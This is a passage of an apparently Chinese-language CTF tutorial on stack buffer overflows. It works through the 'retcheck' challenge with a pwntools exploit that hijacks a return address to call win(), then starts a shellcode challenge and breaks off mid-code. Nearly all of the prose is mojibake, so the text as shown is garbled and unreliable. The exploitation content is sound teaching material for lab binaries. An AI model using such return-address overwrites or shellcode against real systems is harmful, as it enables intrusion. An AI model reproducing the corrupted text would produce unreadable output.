codeï¼Œä¸€é–‹å§‹æœƒå®£å‘Šä¸€äº›å€åŸŸè®Šæ•¸ï¼Œåšä¸€äº›é‹ç®—é‚è¼¯ï¼Œç„¶å¾Œåƒä¸€æ®µä½¿ç”¨è€…è¼¸å…¥çš„åå­—åˆ° name é€™å€‹é•·åº¦ç‚º 64 byte çš„å­—ä¸²è£¡ï¼Œæœ€å¾Œå†æŠŠåå­—å°å‡ºä¾†ã€‚å³é‚Šæ˜¯é€™å€‹å‡½æ•¸ç”¨åˆ°çš„è¨˜æ†¶é«”ç©ºé–“ï¼Œstack frame åº•éƒ¨æœƒå…ˆæ”¾ function prologue å„²å­˜å¥½çš„ return address ä»¥åŠèˆŠçš„ rbp ä½ç½®ï¼Œå†å¾€ä¸Šæ‰æ˜¯å‡½æ•¸å…§éƒ¨ç”¨åˆ°çš„å€åŸŸè®Šæ•¸ã€‚é€™å¡Šç©ºé–“ä¸­ï¼Œå€åŸŸè®Šæ•¸çš„é †åº spec ä¸¦æ²’æœ‰è¦å®šï¼Œä¸»è¦æ˜¯ compiler ç·¨è­¯æ™‚æœƒæ ¹æ“šä¸€äº›å„ªåŒ–è¦å‰‡è·Ÿè¨˜æ†¶é«” alignment åˆ†é…ï¼Œç„¶å¾ŒæŠŠå®‰æ’å¥½çš„é †åºåŒ…é€²åŸ·è¡Œæª”ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/c-to-stack.png\" /><figcaption><p>simple C code and stack frame</p>\n</figcaption></figure></p>\n<p>é€™äº›ç‚ºå€åŸŸè®Šæ•¸é ç•™å¥½çš„ç©ºé–“ï¼Œå°±æ˜¯ä¸€å€‹ä¸€å€‹çš„ bufferï¼Œç•¶è®Šæ•¸è¢«è³¦å€¼æˆ–æ˜¯å¯«å…¥çš„æ™‚å€™ï¼Œè³‡æ–™å°±æœƒå¡«å…¥é€™äº›è¨˜æ†¶é«”ã€‚åœ¨ç¨‹å¼é–‹ç™¼è€…é è¨­çš„æƒ…æ³ä¸‹ï¼Œä½¿ç”¨è€…çš„åå­—å¹¾ä¹ä¸æœƒè¶…é 64 byteï¼Œæ‰€ä»¥ä»–é æœŸç”¨æˆ¶è¼¸å…¥åå­—ä¹‹å¾Œï¼Œè¨˜æ†¶é«”å°±æœƒé•·å¾—åƒä¸‹é¢å·¦é‚Šçš„æ¨£å­ï¼Œä¸€å€‹è˜¿è””ä¸€å€‹å‘ã€‚</p>\n<p>ä½†æ˜¯ï¼Œé€™è£¡æœ‰ä¸€å€‹è‡´å‘½çš„ç¼ºé»ã€‚åœ¨ C èªè¨€ä¸­ï¼Œ<code>gets(char s*)</code> é€™å€‹å‡½æ•¸æœƒå¾ stdin è®€å–ä¸€è¡Œå­—ä¸¦å­˜åˆ° s æŒ‡åˆ°çš„è¨˜æ†¶é«”ä½ç½®ä¸­ï¼Œæ‰€è¬‚ã€ä¸€è¡Œå­—ã€å°±æ˜¯èªªï¼Œåœ¨é‡åˆ°æ›è¡Œç¬¦è™Ÿæˆ– EOF å‰éƒ½æœƒä¸€ç›´è®€ä¸‹å»ã€‚</p>\n<p>ä½ å¯èƒ½ç™¼ç¾å•é¡Œåœ¨å“ªäº†ï¼šç•¶è®€å–çš„å­—ä¸²é•·åº¦è¶…éäº†åˆ†é…çš„è¨˜æ†¶é«”å¤§å°æœƒæ€éº¼æ¨£å‘¢ï¼Ÿ</p>\n<p>ç­”æ¡ˆå°±æ˜¯ï¼šæœƒæŠŠå¾Œé¢çš„è¨˜æ†¶é«”ç©ºé–“è¦†å¯«éå»ï¼Œé€™å°±å«åšæº¢ä½ï¼ˆoverflowï¼‰ã€‚</p>\n<p>é‚£æº¢ä½åˆæœƒå¦‚ä½•ï¼Ÿåˆ¥å¿˜äº†ï¼Œç•¶ä½ æŠŠå€åŸŸè®Šæ•¸çš„ç©ºé–“éƒ½è“‹éå»äº†ï¼Œä¸‹é¢å…©å¡Šè¨˜é«”å°±æ˜¯èˆŠçš„ rbp ä½ç½®è·Ÿå‡½æ•¸çµæŸå¾Œè¦å›å¾©åŸ·è¡Œçš„ return addressã€‚å¦‚æœå†å¤šå¯«ä¸€é»è“‹éå»ï¼Œé‚£ä½ å°±å¯ä»¥ç«„æ”¹ return addressï¼ŒæŒæ§ç¨‹å¼çš„é‹ä½œæµç¨‹ï¼ˆhijack control flowï¼‰ï¼ŒåŸ·è¡Œä½ æƒ³è¦çš„é‚è¼¯ï¼ä¸‹åœ–å³é‚Šå°±æ˜¯ç•¶ä½ è¼¸å…¥ä¸€å¤§ä¸²çš„ A æŠŠè¨˜æ†¶é«”éƒ½å¡«æ»¿ä¹‹å¾Œæœƒå™´çš„éŒ¯èª¤ï¼Œå› ç‚º return address æŒ‡å‘ä¸å­˜åœ¨ç¨‹å¼é‚è¼¯çš„ 0xAAAAAAAA æ‰€ä»¥å°è‡´ç¨‹å¼ crash å ±å‡º segmentation fault çš„éŒ¯èª¤ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/stack-overflow.png\" /><figcaption><p>buffer overflow!</p>\n</figcaption></figure></p>\n<p>ä»¥ä¸Šå°±æ˜¯æœ€åŸºç¤çš„ stack-based buffer overflow æ¨¡å‹ã€‚åœ¨ pwn çš„é¡Œç›®ä¸­ï¼Œæˆ‘å€‘çš„ç›®æ¨™å°±æ˜¯è¦æƒ³è¾¦æ³•æ§åˆ¶ return address ä¾†é”åˆ° RCEã€‚å†ä¾†è®“æˆ‘å€‘ç”¨å¹¾å€‹ç°¡å–®çš„å°é¡Œç›®å¯¦éš›ç·´ç¿’ä¸€ä¸‹å§ï¼</p>\n<h2 id=\"simple-retaddr-overwrite---retcheck\"><a class=\"direct-link\" href=\"#simple-retaddr-overwrite---retcheck\">#</a> Simple retaddr overwrite - retcheck</h2>\n<p>ç¬¬ä¸€å€‹ç°¡å–®çš„å°ç¯„ä¾‹æˆ‘å€‘ç”¨ 2021 Hactivitycon CTF çš„æš–èº«é¡Œ retcheck ç¤ºç¯„å¦‚ä½•ç¯¡æ”¹ return addressã€‚ä½ å¯ä»¥åœ¨<a href=\"https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/retcheck\">é€™è£¡</a>ä¸‹è¼‰æ“‹æ¡ˆè‡ªå·±ç·´ç¿’ã€‚</p>\n<p>è·Ÿä¹‹å‰ reverse çš„æ–¹æ³•ä¸€æ¨£ï¼Œæˆ‘å€‘å…ˆè·‘ä¸€æ¬¡çœ‹çœ‹ã€‚ä½ æœƒç™¼ç¾å®ƒå°±æ˜¯è·Ÿä½¿ç”¨è€…è¦ä¸€è¡Œè¼¸å…¥ï¼Œç„¶å¾Œå°±çµæŸäº†ï¼Œéå¸¸ç°¡çŸ­ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-run.png\" /><figcaption><p>running retcheck</p>\n</figcaption></figure></p>\n<p>ç”¨ <code>file</code> å¾—çŸ¥æª”æ¡ˆ not stripped æ‰€ä»¥ symbols éƒ½é‚„åœ¨ï¼Œç„¶å¾Œç”¨ GDB æ‰“é–‹é€™å€‹æª”æ¡ˆçœ‹ä¸€ä¸‹ <code>main()</code> ï¼Œç™¼ç¾åªæ˜¯å»å‘¼å« <code>vuln()</code> é€™å€‹å‡½æ•¸ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-main.png\" /><figcaption><p>main function</p>\n</figcaption></figure></p>\n<p>å†ä¾†è·Ÿé€²åˆ° <code>vuln()</code> çœ‹çœ‹åšäº†å“ªäº›äº‹ã€‚æ‰£é™¤è·Ÿä½¿ç”¨è€…è¦è¼¸å…¥çš„æ ¸å¿ƒé‚è¼¯ï¼Œé€™é¡Œç‰¹åˆ¥è™•ç†çš„åœ°æ–¹æ˜¯ä¸€é–‹å§‹æŠŠ return address å­˜èµ·ä¾†ï¼ˆåˆ° <code>0x404030</code>ï¼‰ï¼Œæœ€å¾Œå†æª¢æŸ¥ return address çš„å€¼æ˜¯ä¸æ˜¯è·Ÿå­˜èµ·ä¾†çš„ä¸€æ¨£ï¼Œå¦‚æœæœ‰è¢«æ”¹å‹•å°±æœƒè§¸ç™¼ <code>abort</code>ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-vuln.png\" /><figcaption><p>vuln function</p>\n</figcaption></figure></p>\n<p>æˆ‘å€‘å¯ä»¥å¯«æˆæ ¸å¿ƒé‚è¼¯å¦‚ä¸‹ï¼š</p>\n<pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">400</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">get</span> <span class=\"token expression\">current <span class=\"token keyword\">return</span> address</span></span><br>    RETADDR <span class=\"token operator\">=</span> in_stack_0000<span class=\"token punctuation\">;</span><br>    <br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"retcheck enabled!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    l <span class=\"token operator\">=</span> <span class=\"token function\">strcspn</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    buf<span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"\\00\"</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">check</span> <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token keyword\">return</span> address is modified</span></span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>in_stack_0000 <span class=\"token operator\">!=</span> RETADDR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token function\">abort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span><br><span class=\"token punctuation\">}</span>  </code></pre>\n<p>æ¥ä¸‹ä¾†è©²å¦‚ä½• exploit å‘¢ï¼Ÿæˆ‘å€‘çš„ç­–ç•¥æ˜¯ï¼šåˆ¤æ–·æˆ‘å€‘æœ‰å“ªäº›å¯ä»¥åˆ©ç”¨çš„å¼±é»ï¼Œæ‰¾åˆ°å¯ä»¥ overflow çš„åœ°æ–¹ï¼Œå˜—è©¦æˆåŠŸè“‹é return addressï¼Œæœ€å¾Œè€ƒæ…®å¦‚ä½•é¿éæª¢æŸ¥æ©Ÿåˆ¶ã€‚</p>\n<p>å…ˆæª¢æŸ¥é€™å€‹æª”æ¡ˆä½¿ç”¨äº†å“ªäº›è¨˜æ†¶é«”ä¿è­·æ©Ÿåˆ¶ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-checksec.png\" /><figcaption><p>checksec</p>\n</figcaption></figure></p>\n<p>ç°¡å–®ä»‹ç´¹ä¸€ä¸‹é€™å¹¾ç¨®æ©Ÿåˆ¶ï¼š</p>\n<ul>\n<li>canary: ä¸€å€‹æ”¾åœ¨ stack ä¸Šçš„éš¨æ©Ÿå€¼ï¼Œä½ç½®åœ¨ old rbp è·Ÿ return address ä¹‹å‰ï¼Œæœƒåœ¨å‡½æ•¸è¦çµæŸçš„æ™‚å€™è¢«æª¢æŸ¥å€¼æ˜¯å¦è¢«æ›´å‹•ï¼Œä½œç‚ºåˆ¤æ–·æ˜¯å¦æœ‰ overflow çš„ä¾æ“šã€‚</li>\n<li>fortify: ç·¨è­¯æ™‚ï¼Œcompiler æœƒå°å¯é çŸ¥é•·åº¦ä¸”èˆ‡ libc å‡½æ•¸å‘¼å«æœ‰é—œçš„è®Šæ•¸åšé•·åº¦ä¸Šé™çš„æª¢æŸ¥ï¼Œå¦‚æœåŸ·è¡Œæ™‚ç™¼ç¾æœ‰è¶Šç•Œçš„å‡½æ•¸ï¼Œå°±æœƒç¨‹å¼å°±æœƒå¼·åˆ¶çµæŸ</li>\n<li>NX: <strong>N</strong>on-<strong>E</strong>xecutableï¼Œå¼·åˆ¶ã€å¯å¯«æ®µä¸å¯åŸ·è¡Œï¼Œå¯åŸ·è¡Œæ®µä¸å¯å¯«ã€çš„åŸå‰‡ï¼Œä¹Ÿå°±æ˜¯ç„¡æ³•ç›´æ¥å¯« shellcode ç„¶å¾ŒåŸ·è¡Œï¼Œä»¥åŠä¸èƒ½ç«„æ”¹å¯åŸ·è¡Œçš„å€æ®µã€‚</li>\n<li>PIE: <strong>P</strong>osition <strong>I</strong>ndependent <strong>E</strong>xecutableï¼Œè®“è¨˜æ†¶é«”å€æ®µéš¨æ©Ÿåˆ†é…ï¼Œæ‰€ä»¥åŸ·è¡Œå‰æ²’è¾¦æ³•æº–ç¢ºçŸ¥é“ base address çš„ä½ç½®ï¼Œä¹Ÿå°±æ¨ç®—ä¸å‡ºå‡½æ•¸èˆ‡è®Šæ•¸çš„åœ°å€ã€‚</li>\n<li>RELRO: <strong>Rel</strong>ocation <strong>R</strong>ead-<strong>O</strong>nlyï¼Œä»£è¡¨ binary ä¸­çš„ header åœ¨ linker åŸ·è¡Œå®Œå¾Œæœƒæ˜¯ read-onlyï¼Œå¦‚æœæ˜¯ FULL RELRO ç”šè‡³é€£ GOT è¡¨ä¹Ÿæœƒä¸€é–‹å§‹å¡«å¥½ä¸¦è®Šæˆå”¯è®€ã€‚</li>\n</ul>\n<p>é€™é¡Œåªé–‹äº† NX è·Ÿ RELROï¼Œæ‰€ä»¥æˆ‘å€‘ä¸èƒ½ç”¨ shellcode æˆ–æ˜¯ GOT hijacking ï¼ˆç«„æ”¹ GOT è¡¨æŠŠ libc å‡½æ•¸æŒ‡å‘ç›®æ¨™å‡½æ•¸ï¼‰çš„æŠ€å·§ã€‚ä½†æ˜¯æ²’æœ‰é–‹ PIEï¼Œæ‰€ä»¥è¡¨ç¤ºæª”æ¡ˆå…§å‡½æ•¸çš„ä½ç½®æ˜¯å›ºå®šçš„ï¼Œæˆ‘å€‘å¯ä»¥å¾ debugger è£¡é¢é¸æŸå€‹å¥½ç”¨é©åˆçš„ç›®æ¨™å‡½æ•¸çš„ä½ç½®ç„¶å¾ŒæŠŠ return address å°éå»ã€‚</p>\n<p>æˆ‘å€‘ç”¨ <code>info functions</code> çœ‹çœ‹æœ‰å“ªäº›å‡½æ•¸ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-func.png\" /><figcaption><p>funcs</p>\n</figcaption></figure></p>\n<p><code>win()</code> çœ‹èµ·ä¾†ç‰¹åˆ¥æœ‰è¶£ï¼Œç°¡å–®çœ‹ä¸€ä¸‹æœƒç™¼ç¾å®ƒå°±æ˜¯è®€å– <code>flag.txt</code> ç„¶å¾Œå°å‡º flagã€‚ä¹Ÿå°±æ˜¯èªªæˆ‘å€‘åªè¦èƒ½åŸ·è¡Œ <code>win()</code> å°±æˆåŠŸäº†ï¼</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-win.png\" /><figcaption><p>win</p>\n</figcaption></figure></p>\n<p>å†ä¾†çœ‹çœ‹å“ªè£¡å¯ä»¥é€ æˆ overflow å‘¢ï¼Ÿæˆ‘å€‘çŸ¥é“ä½¿ç”¨äº† <code>gets()</code> é€™å€‹å±éšªå‡½æ•¸ï¼Œè€Œä¸” input æ˜¯ <code>[rbp-0x190]</code> é€™å€‹è¨˜æ†¶é«”ä½ç½®ï¼Œæ‰€ä»¥å­—ä¸² buffer é•·åº¦è¶…é 0x190 å°±æœƒæº¢å‡ºåˆ†é…çš„ç©ºé–“ï¼Œè¦†å¯«åˆ°å¾Œé¢çš„è¨˜æ†¶é«”ã€‚</p>\n<p>ç‚ºäº†åˆ¤æ–·å¤šå°‘å­—å…ƒæœƒè“‹é return addressï¼Œç¬¬ä¸€æ¬¡ç·´ç¿’ï¼Œæˆ‘å€‘çš„ç­–ç•¥æ˜¯å¡«æ»¿å­—ä¸² buffer å¾Œæ¯æ¬¡å¤šåŠ  8 byteï¼Œçœ‹ä»€éº¼æ™‚å€™æœƒå‰›å¥½è§¸ç™¼ abortï¼Œä¸€èˆ¬ä¾†èªªæ˜¯çœ‹è§¸ç™¼ segmentation faultï¼Œä½†å› ç‚ºé€™è£¡çš„ç¨‹å¼é‚è¼¯åœ¨çµæŸå‰æœƒå…ˆåˆ¤æ–· return address æ˜¯å¦è¢«ç¯¡æ”¹ï¼Œæ‰€ä»¥æˆ‘å€‘çš„è¼¸å…¥å¦‚æœæœƒé€ æˆ abort å°±è¡¨ç¤ºæˆ‘å€‘å¯«åˆ° return address å•¦ï¼æˆ‘å€‘å…ˆæ‰‹å‹•å‰µå»ºä¸€å€‹éå¸¸é•·çš„å­—ä¸²ï¼Œå˜—è©¦è“‹éå­—ä¸² buffer å¾Œé¢çš„ä¸€æ ¼åœ°å€ï¼š<code>'A'*0x190 + 'B'*8</code>ï¼Œç„¶å¾Œè·‘èµ·ä¾†è¼¸å…¥ç¨‹å¼ä¸­ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-abort.png\" /><figcaption><p>abort</p>\n</figcaption></figure></p>\n<p>å±…ç„¶é¦¬ä¸Šå°± abort äº†ï¼Œæˆ‘å€‘ä¸€æ¬¡å°±è“‹éå»äº†å—ï¼</p>\n<p>Nononoï¼Œé€™æ˜¯å€‹å¤©å¤§çš„èª¤æœƒã€‚æˆ‘å€‘å†è©¦ä¸€æ¬¡ï¼Œé€™æ¬¡è¨­ä¸€å€‹æ–·é»åœ¨åˆ¤æ–· abort çš„åœ°æ–¹ï¼š<code>&lt;vuln+108&gt; cmp rdx, rax</code>ï¼Œç„¶å¾Œå†è·‘ä¸€æ¬¡ï¼Œé€™æ¬¡åœåœ¨ä¸­æ–·é»ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-break.png\" /><figcaption><p>breakpoint</p>\n</figcaption></figure></p>\n<p>ä½ æœƒç™¼ç¾ï¼Œé æœŸå„²å­˜çš„åœ°å€æ˜¯ <code>0x401465</code>ï¼Œä½†å¯¦éš›æ‹¿åˆ°çš„å»æ˜¯ <code>0x401400</code>ï¼Œæ˜æ˜æˆ‘å€‘å¯«çš„æ˜¯ 'A' å‘€ï¼Œæ€éº¼æœƒæœ‰ null byte å‘¢ï¼Ÿé‚£æ˜¯å› ç‚ºç•¶ä½ æŒ‰ä¸‹ [ENTER] é€å‡ºå­—ä¸²çš„æ™‚å€™ï¼Œå¾Œé¢æ˜¯æœƒè£œä¸€å€‹ '\\n' çš„æ›è¡Œç¬¦è™Ÿï¼Œä¹Ÿå°±æ˜¯ä½ é€çš„å¯¦éš›ä¸Šæ˜¯ 0x190 + 8 + 1 = 489 bytes ã€‚è€Œåœ¨ç¨‹å¼ä¸­æœƒæŠŠæ›è¡Œç¬¦è™Ÿæ›¿æ›æˆ null byteï¼Œæ‰€ä»¥æ‰æœƒæŠŠ return address çš„æœ€å¾Œä¸€å€‹ byte è“‹éå»ã€‚</p>\n<p>åˆ°é€™è£¡ï¼Œæˆ‘å€‘çŸ¥é“ä¸‰ä»¶äº‹ï¼š</p>\n<ol>\n<li>return address çš„ä½ç½®æ‰¾åˆ°äº†ï¼Œæ˜¯ 0x190 + 8 = 0x198 å¾Œçš„ 8 å€‹ bytes</li>\n<li>return address çš„å€¼ä¹ŸçŸ¥é“äº†ï¼Œæ˜¯ <code>0x401465</code></li>\n<li>ç›®æ¨™å‡½æ•¸æ˜¯ <code>win()</code>ï¼Œåœ¨ <code>0x4012e9</code> çš„ä½ç½®</li>\n</ol>\n<p>ç¾åœ¨å°·å°¬äº†ï¼Œæˆ‘å€‘çš„ç›®æ¨™æ˜¯è¦æŠŠ return address è“‹æˆ <code>win()</code>ï¼Œä½†é€™æ¨£åˆæœƒè§¸ç™¼æª¢æŸ¥æ©Ÿåˆ¶è®“ç¨‹å¼ç›´æ¥ abortï¼Œè©²å¦‚ä½•é¿é–‹å‘¢ï¼Ÿ</p>\n<p>ä½ å¯ä»¥è©¦è©¦çœ‹ï¼Œå¦‚æœæŠŠ return address æ”¾ <code>0x401465</code> è®“ç¨‹å¼ä¸è¦ abort æ­£å¸¸çµæŸï¼Œç„¶å¾Œå¾æˆ‘å€‘å‰›å‰›çš„ä¸­æ–·é»é–‹å§‹é€æ­¥åŸ·è¡Œï¼Œä½ æœƒç™¼ç¾ç¨‹å¼æ˜¯é€™æ¨£åŸ·è¡Œçš„ï¼šæ­£å¸¸é›¢é–‹ <code>vuln()</code> ä¹‹å¾Œæœƒå›åˆ° <code>main()</code> çµå°¾çš„åœ°æ–¹ï¼Œé€™æ™‚æœƒåŸ·è¡Œ <code>mov eax,0x0; pop rbp; ret;</code>ï¼Œæ­¤æ™‚çš„ stack æ¥çºŒè‘—æˆ‘å€‘å‰›å‰› <code>vuln()</code> ä½¿ç”¨çš„ç©ºé–“ï¼ŒæŠŠ old rbp é‚„åŸä¸¦å†æ¬¡ returnã€‚å°ç…§è‘— <code>main()</code> çš„ assemblyï¼Œæˆ‘å€‘å¯ä»¥ç•«å‡º stack çš„æ¨£å­ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-stack.png\" /><figcaption><p>call frames</p>\n</figcaption></figure></p>\n<p>æ‰€ä»¥é›–ç„¶æˆ‘å€‘ä¸èƒ½åœ¨ <code>vuln()</code> è£¡ç›´æ¥è“‹æ‰ return addressï¼Œä½†åªè¦å¾€å¾Œå¤šå¯«å…©å€‹ï¼Œå°±å¯ä»¥è“‹æ‰ <code>main()</code> çš„ return address å•¦ï¼</p>\n<p>è‡³æ­¤é€™é¡Œå·®ä¸å¤šå°±çµæŸäº†ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ python + pwntools ä¾†å¯« exploit</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span><br><br>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'DEBUG'</span><br><br>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./retcheck'</span><span class=\"token punctuation\">)</span><br><span class=\"token comment\">#p= remote('challenge.ctf.games', 31463)</span><br><br>retaddr <span class=\"token operator\">=</span> <span class=\"token number\">0x401465</span><br>win <span class=\"token operator\">=</span> <span class=\"token number\">0x4012e9</span><br><br>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token number\">408</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>retaddr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'B'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>win<span class=\"token punctuation\">)</span><br><br>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<p>local éš¨ä¾¿å‰µä¸€å€‹ flag.txt ä¾†è©¦è©¦çœ‹ï¼ŒæˆåŠŸå°å‡º flagï¼</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/retcheck-flag.png\" /><figcaption><p>flag</p>\n</figcaption></figure></p>\n<h2 id=\"simple-shellcode---shellcoded\"><a class=\"direct-link\" href=\"#simple-shellcode---shellcoded\">#</a> Simple shellcode - shellcoded</h2>\n<p>å†ä¾†æˆ‘å€‘çœ‹å€‹ç¶“å…¸çš„ shellcode é¡Œï¼Œé¡Œç›®ä½ å¯ä»¥åœ¨<a href=\"https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/shellcoded\">é€™è£¡</a>ä¸‹è¼‰ã€‚</p>\n<p>shellcode åŸºæœ¬ä¸Šå°±æ˜¯å¯ä»¥ç›´æ¥åŸ·è¡Œã€ç”±çµ„èªæŒ‡ä»¤è½‰æˆçš„ä¸€ç³»åˆ—çš„ machine codeã€‚å› ç‚ºéœ€è¦å¯å¯«èˆ‡å¯åŸ·è¡Œçš„è¨˜æ†¶é«”ç©ºé–“ï¼Œé€™å€‹æŠ€å·§å¸¸ç”¨æ–¼ process injection åˆ°æ²’æœ‰ NX ä¿è­·çš„æª”æ¡ˆè£¡ï¼Œå¯ä»¥è¼•é¬†åšåˆ° RCEã€‚</p>\n<p>è·‘ä¾†è·Ÿå‰›å‰›é¡ä¼¼ï¼Œä¹Ÿæ˜¯è«‹ä½ è¼¸å…¥ä¸€äº›æ±è¥¿ï¼Œä½†é€™è£¡é¦¬ä¸Šå°±å™´å‡ºäº†ä¸€å€‹ segfaultã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/shellcoded-run.png\" /><figcaption><p>running shellcoded</p>\n</figcaption></figure></p>\n<p>ç™¼ç”Ÿä»€éº¼äº‹äº†å‘¢ï¼Ÿé€™æ¬¡æˆ‘å€‘ç”¨å¦ä¸€å€‹å¾ˆæ£’çš„<s>æ‡¶äºº</s>å·¥å…·çœ‹çœ‹ï¼š Ghidraã€‚Ghidra æ˜¯ NSA é–‹ç™¼çš„ reverse å·¥å…·ï¼Œæœ€çˆ½çš„åœ°æ–¹æ˜¯å¯ä»¥è®“è²·ä¸èµ· IDA Pro çš„äººç”¨ decompile çš„åŠŸèƒ½ï¼Œé›–ç„¶ä¸å¯èƒ½ç™¾åˆ†ç™¾é‚„åŸï¼ˆè€Œä¸”æœ‰æ™‚å€™ assembly é‚„å¥½æ‡‚ä¸€é»ï¼‰ï¼Œä½† Ghidra é‚„æ˜¯æˆ‘æ­é… gdb æˆ– radare2 å‹•æ…‹åŸ·è¡Œæ™‚å¸¸ç”¨çš„å¥½å¤¥ä¼´ã€‚</p>\n<p>è·‘èµ·ä¾†å¤§æ¦‚æœƒé•·é€™æ¨£ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/pwn-intro/shellcoded-ghidra.png\" /><figcaption><p>shellcoded Ghidra</p>\n</figcaption></figure></p>\n<p>ç¨‹å¼ç¢¼çš„éƒ¨åˆ†æ•´ç†ä¸€ä¸‹ï¼ŒåŠ ä¸€äº›è¨»è§£è·Ÿæ›è®Šæ•¸åç¨±ï¼Œæœƒé•·é€™æ¨£ï¼š</p>\n<pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">char</span> cVar1<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">int</span> mem_perm_result<span class=\"token punctuation\">;</span><br>    code <span class=\"token operator\">*</span>__buf<span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">size_t</span> buf_size<span class=\"token punctuation\">;</span><br>    uint count<span class=\"token punctuation\">;</span><br>    <br>    <span class=\"token comment\">// allocate memory for buffer</span><br>    __buf <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>code <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">aligned_alloc</span><span class=\"token punctuation\">(</span>PAGE_SIZE<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>__buf <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>code <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to allocate memory.\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x1b</span><span class=\"token punctuation\">,</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <br>    <span class=\"token comment\">// read shellcode from user</span><br>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your shellcode.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    buf_size <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>__buf<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;</span> buf_size<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>        <span class=\"token comment\">// process shellcode</span><br>        <span class=\"token keyword\">for</span> <span class=\"token 